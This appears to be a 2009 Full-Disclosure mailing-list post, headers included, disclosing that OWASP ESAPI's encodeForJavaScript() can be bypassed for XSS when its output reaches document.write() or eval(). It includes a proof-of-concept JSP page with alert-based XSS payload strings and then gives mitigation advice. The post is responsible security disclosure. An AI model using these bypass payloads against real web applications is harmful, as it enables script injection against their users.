[From nobody Thu Aug 20 12:00:02 2009
Return-Path: &lt;full-disclosure-bounces@lists.grok.org.uk&gt;
Received: from murder ([unix socket]) by scruffy (Cyrus v2.2.12) with LMTPA;
	Thu, 20 Aug 2009 09:25:17 +0100
X-Sieve: CMU Sieve 2.2
Received: from mail155.messagelabs.com (mail155.messagelabs.com
	[85.158.138.35])
	by mail.realexpayments.com (Postfix) with SMTP id 7D40919C0F1
	for &lt;david.rook@realexpayments.com&gt;;
	Thu, 20 Aug 2009 09:25:16 +0100 (IST)
X-VirusChecked: Checked
X-Env-Sender: full-disclosure-bounces@lists.grok.org.uk
X-Msg-Ref: server-6.tower-155.messagelabs.com!1250756713!27333954!1
X-StarScan-Version: 6.1.3; banners=-,-,-
X-Originating-IP: [78.109.215.201]
X-SpamReason: No, hits=0.0 required=7.0 tests=sa_preprocessor: 
	VHJ1c3RlZCBJUDogNzguMTA5LjIxNS4yMDEgPT4gOTc0MDY=\n
Received: (qmail 11988 invoked from network); 20 Aug 2009 08:25:13 -0000
Received: from lists.grok.org.uk (HELO lists.grok.org.uk) (78.109.215.201)
	by server-6.tower-155.messagelabs.com with SMTP;
	20 Aug 2009 08:25:13 -0000
Received: from lists.grok.org.uk (localhost [127.0.0.1])
	by lists.grok.org.uk (Postfix) with ESMTP id 2248B525;
	Thu, 20 Aug 2009 09:24:49 +0100 (BST)
X-Original-To: full-disclosure@lists.grok.org.uk
Delivered-To: full-disclosure@lists.grok.org.uk
Received-SPF: none (lists.grok.org.uk: domain of inferno@securethoughts.com
	does not designate permitted sender hosts)
Received: from gateway11.websitewelcome.com (unknown [69.41.255.4])
	by lists.grok.org.uk (Postfix) with SMTP id 632D1332
	for &lt;full-disclosure@lists.grok.org.uk&gt;;
	Thu, 20 Aug 2009 09:24:37 +0100 (BST)
Received: (qmail 13770 invoked from network); 20 Aug 2009 08:28:05 -0000
Received: from gator690.hostgator.com (174.132.159.194)
	by gateway11.websitewelcome.com with SMTP; 20 Aug 2009 08:28:05 -0000
Received: from c-24-23-158-44.hsd1.ca.comcast.net ([24.23.158.44]:4805
	helo=ACOMP1)
	by gator690.hostgator.com with esmtpsa (TLSv1:RC4-MD5:128)
	(Exim 4.69) (envelope-from &lt;inferno@securethoughts.com&gt;)
	id 1Me2pt-00021H-MC
	for full-disclosure@lists.grok.org.uk; Thu, 20 Aug 2009 03:17:29 -0500
From: &quot;Inferno&quot; &lt;inferno@securethoughts.com&gt;
To: &lt;full-disclosure@lists.grok.org.uk&gt;
Date: Thu, 20 Aug 2009 01:17:26 -0700
Message-ID: &lt;002101ca216e$a7d08420$f7718c60$@com&gt;
MIME-Version: 1.0
X-Mailer: Microsoft Office Outlook 12.0
Thread-Index: AcohbqWp5mTsIg6aRri3WTpvAPylPg==
Content-Language: en-us
X-AntiAbuse: This header was added to track abuse,
	please include it with any abuse report
X-AntiAbuse: Primary Hostname - gator690.hostgator.com
X-AntiAbuse: Original Domain - lists.grok.org.uk
X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
X-AntiAbuse: Sender Address Domain - securethoughts.com
Subject: [Full-disclosure] Bypassing OWASP ESAPI XSS Protection inside
	Javascript
X-BeenThere: full-disclosure@lists.grok.org.uk
Precedence: list
List-Id: An unmoderated mailing list for the discussion of security issues
	&lt;full-disclosure.lists.grok.org.uk&gt;
List-Unsubscribe: &lt;https://lists.grok.org.uk/mailman/listinfo/full-disclosure&gt;, 
	&lt;mailto:full-disclosure-request@lists.grok.org.uk?subject=unsubscribe&gt;
List-Archive: &lt;http://lists.grok.org.uk/pipermail/full-disclosure&gt;
List-Post: &lt;mailto:full-disclosure@lists.grok.org.uk&gt;
List-Help: &lt;mailto:full-disclosure-request@lists.grok.org.uk?subject=help&gt;
List-Subscribe: &lt;https://lists.grok.org.uk/mailman/listinfo/full-disclosure&gt;, 
	&lt;mailto:full-disclosure-request@lists.grok.org.uk?subject=subscribe&gt;
Content-Type: text/plain; charset=&quot;us-ascii&quot;
Content-Transfer-Encoding: 7bit
Sender: full-disclosure-bounces@lists.grok.org.uk
Errors-To: full-disclosure-bounces@lists.grok.org.uk

Bypassing OWASP ESAPI XSS Protection inside Javascript
------------------------------------------------------
By Inferno (inferno {at} securethoughts {dot} com)

Everyone knows the invaluable XSS cheat sheet maintained by &quot;RSnake&quot;. It is
all about breaking things and features all the scenarios that can result in
XSS. To complement his efforts, there is an excellent XSS prevention cheat
sheet created by &quot;Jeff Williams&quot; (Founder and CEO, Aspect Security). As far
as I have seen, this wiki page provides the most comprehensive information
on protecting yourself from XSS on the internet. It advises using the OWASP
ESAPI api to mitigate any XSS arising from untrusted user input.

I was evaluating this ESAPI api and the recommendations given on the wiki to
see if there are any potential flaws. Any weakness impacts a very large
number of users since many developers are using it to strengthen their web
applications throughout the world. This is my way of contributing back to
the community, but can never match the immense efforts put by Jeff and other
OWASP team members in developing this library.

I want to give you a little bit of background before diving into the real
vulnerability. The XSS prevention cheat sheet classifies XSS protections by
dividing them into broadly four buckets - HTML Body injection, HTML
Attribute injection, Javascript injection and CSS injection. For each of
these four buckets, there is an ESAPI function reference you can use for
output escaping/encoding.

If you allow any untrusted user input into javascript functions
document.write() OR eval(), it can still execute the XSS even after you do
the scrubbing using the ESAPI encodeForJavaScript() function. The reason
being that hex escaped chars are converted back into normal chars at the
time of execution of these functions. 

Here is the proof of concept jsp code:

01.&lt;%@page import=&quot;org.owasp.esapi.*&quot;%&gt;
02. 
03.&lt;%@page contentType=&quot;text/html&quot; pageEncoding=&quot;UTF-8&quot;%&gt;
04.&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;
05.   &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;
06. 
07.&lt;html&gt;
08.    &lt;head&gt;
09.        &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;
charset=UTF-8&quot;&gt;
10.        &lt;title&gt;ESAPI XSS Protection Bypass&lt;/title&gt;
11.    &lt;/head&gt;
12.    &lt;body&gt;
13.        &lt;h1&gt;ESAPI XSS Protection Bypass&lt;/h1&gt;
14.        &lt;p id=&quot;tb1&quot;/&gt;&lt;br&gt;
15.        &lt;p id=&quot;tb2&quot;/&gt;
16.        &lt;script&gt;
17.            //in real scenario, these three strings come from
request.getParameter or user input
18.            &lt;%
19.                String vulstr1 = &quot;-1';alert(0);&quot;;
20.                String vulstr2 = &quot;&lt;img src=x onerror=alert(1)&gt;&quot;;
21.                String vulstr3 = &quot;0,x setter=alert,x=2&quot;;
22.            %&gt;  
23. 
24.            // you can safely use it in places like this
25.            // Ex. vulstr1 is completely encapsulated in a and alert(0)
not executed.
26.            var a='&lt;%= ESAPI.encoder().encodeForJavaScript(vulstr1) %&gt;';
27.            alert(a);
28. 
29.            // However, you can bypass protection in places like these
30.            // Ex. vulstr2 gets written to html and alert(1) executes
31.            document.write(&quot;&lt;%=
ESAPI.encoder().encodeForJavaScript(vulstr2) %&gt;&quot;);
32.            // Ex. part of vulstr3 get assigned to u, rest alert(2)
executes
33.            eval(&quot;u=&lt;%= ESAPI.encoder().encodeForJavaScript(vulstr3)
%&gt;&quot;);
34.        &lt;/script&gt;
35.    &lt;/body&gt;
36.&lt;/html&gt;

Much thanks to Jeremiah Grossman and Jeff Williams for taking the time to
review my idea and providing their insights. Jeremiah told me that he has
seen such injections from time to time at WhiteHat and these do exist in the
wild.

Jeff confirmed that some documentation changes will fix this. I agree that
no esapi code change is required, because function themselves are not
insecure.

But, if you are currently using esapi functions inside your javascript code,
it is important that you re-review your javascript code and the places where
your make calls to esapi functions.

If you use the esapi function encodeForJavaScript() inside document.write,
it is advised that you change them with other appropriate esapi functions
depending on the context where the data is ultimately landing. For example,
if you have document.write(&quot;&lt;script&gt;alert('XSS')&lt;/script&gt;&quot;), you know the
data is landing in html body context, so it is appropriate to use
encodeForHTML() wrapper. Using user input inside eval is less common, but
more disastrous. The reason for this is you can still begin another command
context using , and (space) char and it won't be encoded by function
encodeForHTML(). So, it is better to avoid putting user input inside eval.

Any more suggestions or discussion on fixes is highly welcome.

Thanks and Regards,
Inferno
Security Researcher
SecureThoughts.com


_______________________________________________
Full-Disclosure - We believe in it.
Charter: http://lists.grok.org.uk/full-disclosure-charter.html
Hosted and sponsored by Secunia - http://secunia.com/

]